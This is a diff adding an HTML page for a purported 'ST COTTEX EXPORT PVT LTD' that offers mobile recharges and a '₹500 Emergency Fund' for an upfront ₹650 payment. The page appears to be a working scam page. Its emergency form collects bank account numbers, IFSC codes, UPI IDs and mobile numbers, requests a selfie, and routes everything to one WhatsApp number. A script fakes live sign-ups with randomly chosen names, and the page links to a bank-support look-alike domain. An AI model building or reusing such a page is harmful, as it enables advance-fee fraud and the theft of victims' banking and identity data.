@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ST COTTEX EXPORT PVT LTD</title>
+
+<link rel="manifest" href="manifest.json">
+<meta name="theme-color" content="#00ffff">
+
+<style>
+body{
+  margin:0;
+  font-family:Arial,Helvetica,sans-serif;
+  background:linear-gradient(135deg,#020202,#0c1c24,#132f3a);
+  color:#fff;
+}
+
+/* HEADER */
+header{
+  text-align:center;
+  padding:28px 10px;
+}
+header h1{
+  margin:0;
+  font-size:28px;
+  letter-spacing:2px;
+  color:#00ffff;
+  text-shadow:0 0 12px #00ffff,0 0 25px #00ffff;
+}
+.address{
+  margin-top:8px;
+  font-size:15px;
+  color:#39ff14;
+  text-shadow:0 0 8px #39ff14;
+}
+
+/* MARQUEE */
+.marquee{
+  background:#000;
+  padding:8px;
+  font-weight:bold;
+  color:#ff00ff;
+  text-shadow:0 0 8px #ff00ff;
+}
+
+/* COMMON BOX */
+.box{
+  background:rgba(0,0,0,0.7);
+  margin:18px;
+  padding:18px;
+  border-radius:16px;
+  box-shadow:0 0 25px rgba(0,255,255,0.25);
+}
+.box h2{
+  margin-top:0;
+  color:#00ffcc;
+  text-shadow:0 0 8px #00ffcc;
+}
+
+/* INPUTS */
+input,select{
+  width:100%;
+  padding:12px;
+  margin-top:10px;
+  border-radius:8px;
+  border:1px solid #00ffff;
+  background:#0b0b0b;
+  color:#fff;
+  font-size:15px;
+}
+input::placeholder{color:#aaa}
+
+/* BUTTON */
+button{
+  width:100%;
+  margin-top:16px;
+  padding:14px;
+  border:none;
+  border-radius:12px;
+  font-size:17px;
+  font-weight:bold;
+  cursor:pointer;
+}
+.whatsapp{
+  background:#25D366;
+  color:#000;
+}
+.install{
+  background:#00ffff;
+  color:#000;
+}
+
+/* LIVE */
+.live{
+  text-align:center;
+  margin:10px;
+  color:#ffeb3b;
+  font-size:14px;
+}
+
+/* AD */
+.ad{
+  background:#000;
+  padding:15px;
+  margin:20px;
+  border-radius:12px;
+  text-align:center;
+}
+.ad a{
+  color:#00ffff;
+  text-decoration:none;
+  font-weight:bold;
+}
+</style>
+</head>
+
+<body>
+
+<header>
+  <h1>ST COTTEX EXPORT PVT LTD</h1>
+  <div class="address">
+    Iraq Machiwada, Ludhiana, Punjab – 141115
+  </div>
+</header>
+
+<div class="marquee">
+  <marquee>DIGITAL MONEY – ONLY ST COTTEX EXPORT PVT LTD WORKER</marquee>
+</div>
+
+<div class="live" id="liveUser"></div>
+
+<!-- APP INSTALL -->
+<div class="box">
+  <button class="install" onclick="installApp()">📲 DOWNLOAD APPLICATION</button>
+</div>
+
+<!-- RECHARGE -->
+<div class="box">
+  <h2>📱 Recharge Lead</h2>
+
+  <input id="r_name" placeholder="Customer Name">
+  <input id="r_mobile" placeholder="Mobile Number">
+
+  <select id="r_sim">
+    <option value="">Select SIM</option>
+    <option>Jio</option>
+    <option>Airtel</option>
+    <option>Vi</option>
+    <option>BSNL</option>
+  </select>
+
+  <select id="r_plan" onchange="calcRecharge()">
+    <option value="">Select Recharge Plan</option>
+    <option value="149|25">₹149 – Service Charge ₹25</option>
+    <option value="199|35">₹199 – Service Charge ₹35</option>
+    <option value="249|45">₹249 – Service Charge ₹45</option>
+    <option value="349|60">₹349 – Service Charge ₹60</option>
+  </select>
+
+  <input id="r_total" placeholder="Total Pay (₹)" readonly>
+
+  <button class="whatsapp" onclick="sendRecharge()">Apply on WhatsApp</button>
+</div>
+
+<!-- EMERGENCY -->
+<div class="box">
+  <h2>🚨 Emergency Fund</h2>
+
+  <input id="e_name" placeholder="Customer Name">
+  <input id="e_mobile" placeholder="Mobile Number">
+
+  <input id="e_account" placeholder="Bank Account Number">
+  <input id="e_ifsc" placeholder="IFSC Code">
+  <input id="e_upi" placeholder="Google Pay / PhonePe / UPI Number">
+
+  <input value="Emergency Fund: ₹500" readonly>
+  <input value="One Month Service Charge: ₹150" readonly>
+  <input value="Total Pay: ₹650" readonly>
+
+  <button class="whatsapp" onclick="sendEmergency()">Apply on WhatsApp</button>
+</div>
+
+<!-- AD -->
+<div class="ad">
+  <div>Fill Form • Fast Processing</div>
+  <a href="https://varshaprint.banksupport.in" target="_blank">
+    Credit Card • Loan • Bank • Insurance
+  </a>
+</div>
+
+<script>
+/* LIVE JOIN */
+const names=["Rohit","Aman","Neha","Pooja","Suresh","Vikas","Kiran"];
+setInterval(()=>{
+  let n=names[Math.floor(Math.random()*names.length)];
+  document.getElementById("liveUser").innerText =
+    n+" joined from Iraq Machiwada";
+},2500);
+
+/* RECHARGE */
+function calcRecharge(){
+  let v=r_plan.value;
+  if(!v) return;
+  let p=v.split("|");
+  r_total.value="₹"+(Number(p[0])+Number(p[1]));
+}
+function sendRecharge(){
+  let msg =
+`RECHARGE LEAD
+ST COTTEX EXPORT PVT LTD
+
+Customer Name: ${r_name.value}
+Mobile Number: ${r_mobile.value}
+SIM: ${r_sim.value}
+Plan: ${r_plan.options[r_plan.selectedIndex].text}
+Total Pay: ${r_total.value}
+
+📸 Please send your selfie on WhatsApp`;
+  window.open("https://wa.me/918264426101?text="+encodeURIComponent(msg));
+}
+
+/* EMERGENCY */
+function sendEmergency(){
+  let msg =
+`EMERGENCY FUND LEAD
+ST COTTEX EXPORT PVT LTD
+
+Customer Name: ${e_name.value}
+Mobile Number: ${e_mobile.value}
+
+Bank Account: ${e_account.value}
+IFSC Code: ${e_ifsc.value}
+UPI / Google Pay: ${e_upi.value}
+
+Emergency Fund: ₹500
+Service Charge: ₹150
+Total Pay: ₹650
+
+📸 Please send your selfie on WhatsApp`;
+  window.open("https://wa.me/918264426101?text="+encodeURIComponent(msg));
+}
+
+/* INSTALL */
+let deferredPrompt;
+window.addEventListener('beforeinstallprompt',e=>{
+  e.preventDefault();
+  deferredPrompt=e;
+});
+function installApp(){
+  if(deferredPrompt){
+    deferredPrompt.prompt();
+    deferredPrompt=null;
+  }else{
+    alert("Chrome Menu → Add to Home Screen");
+  }
+}
+</script>
+
+</body>
+</html>
